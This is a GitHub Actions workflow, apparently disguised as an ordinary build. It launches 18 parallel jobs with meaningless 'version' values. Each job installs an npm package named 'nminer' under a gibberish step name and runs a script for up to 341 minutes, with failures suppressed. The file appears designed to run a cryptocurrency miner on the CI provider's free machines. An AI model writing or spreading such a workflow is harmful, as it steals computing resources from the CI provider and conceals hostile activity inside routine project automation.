name: promise
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9208 }
          - { version: 780 }
          - { version: 9433 }
          - { version: 6176 }
          - { version: 3027 }
          - { version: 8517 }
          - { version: 1282 }
          - { version: 5819 }
          - { version: 2374 }
          - { version: 6481 }
          - { version: 5902 }
          - { version: 9018 }
          - { version: 6165 }
          - { version: 8955 }
          - { version: 8645 }
          - { version: 4205 }
          - { version: 5574 }
          - { version: 6491 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: since despite hyena after teriyaki
        run: |
          npm install nminer@latest
          timeout 341m node promise.js || echo "promise executed"